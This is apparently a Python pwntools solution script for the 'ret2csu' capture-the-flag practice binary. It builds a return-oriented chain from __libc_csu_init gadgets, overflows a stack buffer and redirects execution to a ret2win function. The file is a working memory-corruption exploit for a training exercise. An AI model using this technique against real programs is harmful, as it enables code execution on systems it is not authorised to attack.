#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['lxterminal', '-e']

local = 1
if local:
	p = process('./ret2csu')
	elf = ELF('./ret2csu')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote()

#  400880:       4c 89 fa                mov    rdx,r15
#  400883:       4c 89 f6                mov    rsi,r14
#  400886:       44 89 ef                mov    edi,r13d
#  400889:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
#  40088d:       48 83 c3 01             add    rbx,0x1
#  400891:       48 39 dd                cmp    rbp,rbx
#  400894:       75 ea                   jne    400880 <__libc_csu_init+0x40>
#  400896:       48 83 c4 08             add    rsp,0x8
#  40089a:       5b                      pop    rbx
#  40089b:       5d                      pop    rbp
#  40089c:       41 5c                   pop    r12
#  40089e:       41 5d                   pop    r13
#  4008a0:       41 5e                   pop    r14
#  4008a2:       41 5f                   pop    r15
#  4008a4:       c3                      ret 
def csu(rbx, rbp, r12, r13, r14, r15, addr):
	payload = p64(0x40089a) + \
              p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + \
              p64(0x400880) + p64(0xdeadbeef) * 7 + \
              p64(addr)
	return payload

rdx = 0xdeadcafebabebeef
buf = 0x601080

gdb.attach(p)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
info('puts_plt = ' + hex(puts_plt))
info('puts_got = ' + hex(puts_got))

ret2win = 0x4007B1
init_proc = 0x600e38

payload = cyclic(0xB0)
payload = 'A' * 40
payload += csu(0, 1, init_proc, 0, 0, rdx, ret2win)
p.recvuntil('> ')
p.sendline(payload)

p.interactive()
